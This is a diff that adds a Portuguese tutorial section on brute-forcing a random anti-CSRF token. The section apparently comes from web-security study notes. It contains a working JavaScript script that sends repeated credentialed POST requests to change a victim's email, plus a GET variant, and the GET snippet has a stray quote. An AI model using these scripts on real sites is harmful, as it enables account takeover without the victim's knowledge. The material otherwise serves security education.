@@ -270,3 +270,67 @@ Após conseguir todas as informações, basta realizar a requisição usando uma
 
 ## Bypassing Anti-CSRF Token Brute Forcing
 
+Para esse cenário, temos uma situação onde não conseguimos roubar os cookies do usuário mas ele vai acessar uma página maliciosa de nosso controle, ou existe um XSS na aplicação onde é possível injetar o código
+
+Como exemplo, será utilizado o mesmo exemplo anterior de alteração de email, porém agora com um token randomico
+
+```html
+<form action="change.php" method="POST">
+	<input type="hidden" name="csrfToken" value="TOKEN"> // randon token
+	<input type="hidden" name="old" value="myC00Lemail@victim.site">
+	<input type="email" name="new" placeholder="your new email" required>
+	<input type="submit" value="Confirm">
+</form>
+```
+
+Para o exemplo, vamos considerar que o token é um número randômico entre 100 e 300
+
+```html
+...
+<form action="change.php" method="POST">
+	<input type="hidden" name="csrfToken" value="TOKEN"> // rand(100, 300);
+...
+```
+
+Para explorar essa vulnerabilidade é necessário criar um script que realiza 200 requisições para esse formulário. Para isso pode-se usar o XMLHttpRequest
+
+```javascript
+var i = 100;
+function bruteLoop(){
+	setTimeout(function(){
+		XHRPost(i);
+		i++;
+		if (i < 300)
+			bruteLoop();
+	}, 30) // sleep a little bit
+}
+
+function XHRPost(tokenID){
+	var http = new XMLHttpRequest();
+	var url = "http://victim.site/csrf/brute/change_post.php"; // Change this
+	http.open("POST", url, true);
+
+	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	http.withCredentials = 'true';
+
+	http.onreadystatechange = function(){ // We don't care about responses
+		if (http.readyState > 1) http.abort();
+	}
+	var params = "old=myoldemail&confirm=1&new=attackerEmail&csrftoken=" + tokenID;
+	http.send(params);
+}
+```
+
+Caso o formulário seja enviado através do método GET/
+
+```javascript
+function MakeGET(tokenID){
+
+	var url = "http://victim.site/csrf/brute/change_post.php?";
+	url += "old=myoldemail&confirm=1&";
+	url += "new=attackerEmail&csrftoken=" + tokenID;"
+
+	new Image().src = url; // GET request
+}
+```
+
